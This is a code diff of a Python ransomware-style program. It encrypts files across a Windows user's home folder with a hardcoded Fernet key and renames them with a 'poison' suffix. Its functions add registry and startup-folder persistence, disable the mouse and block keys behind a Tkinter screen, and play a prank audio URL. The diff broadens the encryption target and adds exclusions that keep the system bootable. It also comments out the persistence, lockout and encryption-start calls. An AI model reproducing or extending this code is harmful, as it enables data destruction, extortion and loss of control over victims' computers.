@@ -18,10 +18,10 @@ global filename
 executing = True
 filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])
 KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
-DEST_PATH: Final = f"C:\\Users\\{getuser()}\\Downloads"
-DIR_EXCLUSIONS: Final = ["backup"]
-FILE_SUFFIX: Final = "lol"
-FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "ini"]
+DEST_PATH: Final = f"C:\\Users\\{getuser()}"
+DIR_EXCLUSIONS: Final = ["backup", "AppData"]
+FILE_SUFFIX: Final = "poison"
+FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "ini", "DAT", "LOG1", "LOG2", "blf", "regtrans-ms"]
 URL: Final = ("https://ia903206.us.archive.org/31/items/rick-astley-never-gonna-give-you-up/Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up.mp3")
 
 
@@ -85,10 +85,13 @@ class Decryption(threading.Thread):
     def decryptFiles(self, file_paths):
         for file in file_paths:
             with open(file, "rb") as binary_file:
-                content = binary_file.read()
+                content = binary_file.read()    
             decrypted_content = Fernet(self.KEY).decrypt(content)
             with open(file, "wb") as binary_file:
-                binary_file.write(decrypted_content)
+                try:
+                    binary_file.write(decrypted_content)
+                except:
+                    print("error")
             os.rename(file, file.replace(f".{self.FILE_SUFFIX}", ""))
 
     def run(self):
@@ -197,12 +200,12 @@ snake = tk.Label(window, bg="red", fg="white", text=
 """,font=("Arial", 22))
 snake.pack(pady=20)
 
-create_autostart_regedit()
-create_autostart_dir()
+# create_autostart_regedit()
+#create_autostart_dir()
 
-threading.Thread(target=disable_mouse, daemon=True).start()
-threading.Thread(target=block_keys, daemon=True).start()
+#threading.Thread(target=disable_mouse, daemon=True).start()
+#threading.Thread(target=block_keys, daemon=True).start()
 
-ec.start()
+# ec.start()
 
 window.mainloop()
